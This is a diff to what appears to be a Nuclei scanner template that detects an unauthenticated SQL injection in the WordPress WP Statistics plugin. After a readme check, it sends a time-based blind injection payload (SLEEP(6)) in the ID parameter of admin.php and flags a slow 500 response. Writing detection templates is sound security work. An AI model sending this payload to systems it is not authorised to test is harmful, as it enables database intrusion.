@@ -17,18 +17,30 @@ info:
     publicwww-query: /wp-content/plugins/wp-statistics/
   tags: sqli,unauth,exploitdb,wp-statistics,wp-plugin,wordpress,wp
 
+flow: http(1) && http(2)
+
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(6))a)"
-      - "{{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt"
+  - raw:
+      - |
+        GET /wp-content/plugins/wp-statistics/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - 'WP Statistics'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(6))a) HTTP/1.1
+        Host: {{Hostname}}
 
     matchers:
       - type: dsl
         dsl:
           - 'duration>=6'
-          - 'contains(content_type, "text/html") && contains(body_2, "WP Statistics")'
           - 'status_code == 500'
         condition: and
-
-# digest: 4a0a00473045022100f4da8a4fa639e345d1927cec57054b9caa885d24d795fd99b7143bf9c351f10d02204a18fb4cd911412a0d3c77b4916424c8d074a3840c36664e57f8ac9f039cee9a:922c64590222798bb761d5b6d8e72950
+# digest: 490a0046304402207ddca08142915363e9410129de63cd4dec2f952c6533ac90242e302b8b04002e02207cc6810c8ca39fc90e82f7419ce5a9ff8f48a48ade72f110dddae015746500d3:922c64590222798bb761d5b6d8e72950
